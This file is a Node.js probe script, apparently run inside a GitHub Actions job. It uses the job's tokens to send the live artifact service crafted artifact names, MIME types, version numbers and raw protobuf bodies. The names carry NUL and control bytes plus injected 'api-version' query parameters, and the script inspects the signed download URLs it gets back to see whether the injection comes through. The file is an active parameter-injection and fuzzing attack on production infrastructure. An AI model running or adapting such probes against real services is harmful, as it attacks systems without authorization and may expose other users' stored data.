import {createHash} from 'node:crypto';
import https from 'node:https';

import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const service = new URL(process.env.ACTIONS_RESULTS_URL).origin +
  '/twirp/github.actions.results.api.v1.ArtifactService/';
const stamp = process.env.GITHUB_RUN_ID;
const nelType = 'application/json\u0085';
const placeholder = Buffer.from('{"probe":"deep"}');
const digest = createHash('sha256').update(placeholder).digest('hex');

function httpRequest(url) {
  return new Promise((resolve, reject) => {
    const request = https.get(url, {headers: {
      accept: 'application/vnd.github.v3+json',
      authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
      'user-agent': 'repo-cassette-deep-probe',
    }}, response => {
      const chunks = [];
      response.on('data', chunk => chunks.push(chunk));
      response.on('end', () => resolve({
        status: response.statusCode,
        headers: response.headers,
        body: Buffer.concat(chunks),
      }));
    });
    request.setTimeout(15000, () => request.destroy(new Error('timeout')));
    request.on('error', reject);
  });
}

async function uploadAndFinalize(name, created) {
  await new BlobClient(created.signedUploadUrl).getBlockBlobClient().uploadData(placeholder, {
    blobHTTPHeaders: {blobContentType: nelType},
  });
  const finalized = await client.FinalizeArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    size: String(placeholder.length),
    hash: StringValue.create({value: `sha256:${digest}`}),
  });
  const internalDownload = await client.GetSignedArtifactURL({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
  });
  const internalUrl = new URL(internalDownload.signedUrl);
  const internal = {
    queryKeys: [...internalUrl.searchParams.keys()].sort(),
    rsct: internalUrl.searchParams.get('rsct'),
    apiVersion: internalUrl.searchParams.get('api-version'),
  };
  const artifactId = String(finalized.artifactId);
  const api = await httpRequest(
    `https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/actions/artifacts/${artifactId}/zip`,
  );
  const location = api.headers.location || '';
  let signed = null;
  if (location) {
    const url = new URL(location);
    signed = {
      path: url.pathname.split('/').at(-1),
      rsct: url.searchParams.get('rsct'),
      apiVersion: url.searchParams.get('api-version'),
      rscdHex: Buffer.from(url.searchParams.get('rscd') || '', 'utf8').toString('hex'),
    };
  }
  return {artifactId, status: api.status, signed, internal};
}

const nameCases = [
  ['nul-amp', `deep-${stamp}-a\0&api-version=2012-02-12.json`],
  ['nul-semi', `deep-${stamp}-b\0;api-version=2012-02-12.json`],
  ['nul-pct-amp', `deep-${stamp}-c\0%26api-version%3D2012-02-12.json`],
  ['nul-nel-amp', `deep-${stamp}-d\0\u0085&api-version=2012-02-12.json`],
  ['fs-amp', `deep-${stamp}-e\u001c&api-version=2012-02-12.json`],
  ['us-amp', `deep-${stamp}-f\u001f&api-version=2012-02-12.json`],
  ['bs-amp', `deep-${stamp}-g\b&api-version=2012-02-12.json`],
  ['del-amp', `deep-${stamp}-h\u007f&api-version=2012-02-12.json`],
];

for (const [label, name] of nameCases) {
  try {
    const created = await client.CreateArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
      version: 7,
      mimeType: StringValue.create({value: 'application/json'}),
    });
    const result = await uploadAndFinalize(name, created);
    console.log('DEEP-NAME', JSON.stringify({
      label,
      nameHex: Buffer.from(name).toString('hex'),
      uploadPath: new URL(created.signedUploadUrl).pathname.split('/').at(-1),
      ...result,
    }));
  } catch (error) {
    console.log('DEEP-NAME', JSON.stringify({label, error: String(error).slice(0, 240)}));
  }
}

const mimeCases = [
  ['nel-comma-json', 'application/json\u0085,application/json'],
  ['nel-space-comma', 'application/json\u0085 , application/json'],
  ['json-comma-nel', 'application/json,\u0085'],
  ['nel-comment', 'application/json\u0085 (x)'],
  ['nel-param', 'application/json\u0085;charset=utf-8'],
  ['nel-tab', 'application/json\u0085\t'],
  ['tab-nel-tab', 'application/json\t\u0085\t'],
  ['nbsp-nel', 'application/json\u00a0\u0085'],
  ['nel-nbsp', 'application/json\u0085\u00a0'],
  ['u10085', 'application/json\u{10085}'],
  ['uff85', 'application/json\uff85'],
  ['u1f85', 'application/json\u1f85'],
  ['u8085', 'application/json\u8085'],
  ['quoted-param-nel', 'application/json;x="\u0085"'],
  ['extended-param', "application/json;x*=UTF-8''%C2%85"],
  ['pct-comma', 'application/json%2Capplication/json'],
];

for (const [label, mime] of mimeCases) {
  const name = `deep-mime-${stamp}-${label}`;
  try {
    const created = await client.CreateArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
      version: 7,
      mimeType: StringValue.create({value: mime}),
    });
    const result = await uploadAndFinalize(name, created);
    console.log('DEEP-MIME', JSON.stringify({
      label,
      mimeHex: Buffer.from(mime).toString('hex'),
      uploadPath: new URL(created.signedUploadUrl).pathname.split('/').at(-1),
      ...result,
    }));
  } catch (error) {
    console.log('DEEP-MIME', JSON.stringify({
      label, mimeHex: Buffer.from(mime).toString('hex'), error: String(error).slice(0, 240),
    }));
  }
}

async function rawCreate(name, versionJson) {
  const body = '{' +
    `"workflow_run_backend_id":${JSON.stringify(ids.workflowRunBackendId)},` +
    `"workflow_job_run_backend_id":${JSON.stringify(ids.workflowJobRunBackendId)},` +
    `"name":${JSON.stringify(name)},` +
    `"version":${versionJson},"mime_type":${JSON.stringify(nelType)}}`;
  const response = await fetch(service + 'CreateArtifact', {
    method: 'POST',
    headers: {
      authorization: `Bearer ${process.env.ACTIONS_RUNTIME_TOKEN}`,
      'content-type': 'application/json',
    },
    body,
  });
  const text = await response.text();
  let data = {};
  try { data = JSON.parse(text); } catch {}
  return {status: response.status, data, text};
}

const versionCases = [
  ['below-round', '6.999999999999999999999999999999999999'],
  ['above-round', '7.000000000000000000000000000000000001'],
  ['wrap-u32', '4294967303'],
  ['wrap-i32', '-4294967289'],
  ['wrap-u64', '18446744073709551623'],
  ['max-i32-plus7', '2147483655'],
  ['min-i32-minus7', '-2147483641'],
  ['seven-exp', '7e0'],
  ['seven-string', '"7"'],
  ['null', 'null'],
];

for (const [label, versionJson] of versionCases) {
  const name = `deep-version-${stamp}-${label}`;
  try {
    const created = await rawCreate(name, versionJson);
    const report = {label, versionJson, status: created.status,
      response: created.text.slice(0, 220)};
    const signedUploadUrl = created.data.signed_upload_url || created.data.signedUploadUrl;
    if (created.status >= 200 && created.status < 300 && signedUploadUrl) {
      Object.assign(report, await uploadAndFinalize(name, {signedUploadUrl}));
      report.uploadPath = new URL(signedUploadUrl).pathname.split('/').at(-1);
    }
    console.log('DEEP-VERSION', JSON.stringify(report));
  } catch (error) {
    console.log('DEEP-VERSION', JSON.stringify({label, versionJson,
      error: String(error).slice(0, 240)}));
  }
}

function encodeVarint(input) {
  let value = BigInt(input);
  const output = [];
  while (value >= 0x80n) {
    output.push(Number(value & 0x7fn) | 0x80);
    value >>= 7n;
  }
  output.push(Number(value));
  return Buffer.from(output);
}

function protobufBytes(fieldNumber, bytes) {
  return Buffer.concat([
    encodeVarint(fieldNumber * 8 + 2),
    encodeVarint(bytes.length),
    bytes,
  ]);
}

function protobufString(fieldNumber, value) {
  const bytes = Buffer.isBuffer(value) ? value : Buffer.from(value, 'utf8');
  return protobufBytes(fieldNumber, bytes);
}

function protobufInt(fieldNumber, value) {
  return Buffer.concat([encodeVarint(fieldNumber * 8), encodeVarint(value)]);
}

function readVarint(bytes, state) {
  let value = 0n;
  let shift = 0n;
  while (state.offset < bytes.length) {
    const byte = bytes[state.offset++];
    value |= BigInt(byte & 0x7f) << shift;
    if ((byte & 0x80) === 0) return value;
    shift += 7n;
  }
  throw new Error('truncated varint');
}

function parseCreateResponse(bytes) {
  const state = {offset: 0};
  const result = {ok: false, signedUploadUrl: ''};
  while (state.offset < bytes.length) {
    const tag = Number(readVarint(bytes, state));
    const field = tag >> 3;
    const wire = tag & 7;
    if (wire === 0) {
      const value = readVarint(bytes, state);
      if (field === 1) result.ok = value !== 0n;
    } else if (wire === 2) {
      const length = Number(readVarint(bytes, state));
      const value = bytes.subarray(state.offset, state.offset + length);
      state.offset += length;
      if (field === 2) result.signedUploadUrl = value.toString('utf8');
    } else {
      throw new Error(`unsupported wire type ${wire}`);
    }
  }
  return result;
}

async function binaryCreate(name, mimeBytes) {
  const nestedMime = protobufBytes(6, protobufString(1, mimeBytes));
  const body = Buffer.concat([
    protobufString(1, ids.workflowRunBackendId),
    protobufString(2, ids.workflowJobRunBackendId),
    protobufString(3, name),
    protobufInt(5, 7),
    nestedMime,
  ]);
  const response = await fetch(service + 'CreateArtifact', {
    method: 'POST',
    headers: {
      authorization: `Bearer ${process.env.ACTIONS_RUNTIME_TOKEN}`,
      'content-type': 'application/protobuf',
    },
    body,
  });
  const responseBytes = Buffer.from(await response.arrayBuffer());
  return {
    status: response.status,
    contentType: response.headers.get('content-type'),
    responseBytes,
    data: response.ok ? parseCreateResponse(responseBytes) : null,
  };
}

const binaryMimeCases = [
  ['raw85-tail', Buffer.concat([Buffer.from('application/json'), Buffer.from([0x85])])],
  ['raw85-head', Buffer.concat([Buffer.from([0x85]), Buffer.from('application/json')])],
  ['raw85-comma', Buffer.concat([Buffer.from('application/json'), Buffer.from([0x85, 0x2c]), Buffer.from('application/json')])],
  ['raw1c-tail', Buffer.concat([Buffer.from('application/json'), Buffer.from([0x1c])])],
  ['raw1f-tail', Buffer.concat([Buffer.from('application/json'), Buffer.from([0x1f])])],
  ['overlong85', Buffer.concat([Buffer.from('application/json'), Buffer.from([0xc0, 0x85])])],
  ['surrogate85', Buffer.concat([Buffer.from('application/json'), Buffer.from([0xed, 0xa0, 0x85])])],
  ['truncated-c2', Buffer.concat([Buffer.from('application/json'), Buffer.from([0xc2])])],
  ['ff-tail', Buffer.concat([Buffer.from('application/json'), Buffer.from([0xff])])],
  ['valid-c285', Buffer.concat([Buffer.from('application/json'), Buffer.from([0xc2, 0x85])])],
];

for (const [label, mimeBytes] of binaryMimeCases) {
  const name = `deep-binary-${stamp}-${label}`;
  try {
    const created = await binaryCreate(name, mimeBytes);
    const report = {
      label,
      mimeHex: mimeBytes.toString('hex'),
      status: created.status,
      contentType: created.contentType,
      responseHex: created.responseBytes.subarray(0, 160).toString('hex'),
      responseText: created.responseBytes.subarray(0, 220).toString('utf8'),
    };
    if (created.data?.ok && created.data.signedUploadUrl) {
      Object.assign(report, await uploadAndFinalize(name, created.data));
      report.uploadPath = new URL(created.data.signedUploadUrl).pathname.split('/').at(-1);
    }
    console.log('DEEP-BINARY', JSON.stringify(report));
  } catch (error) {
    console.log('DEEP-BINARY', JSON.stringify({
      label, mimeHex: mimeBytes.toString('hex'), error: String(error).slice(0, 240),
    }));
  }
}
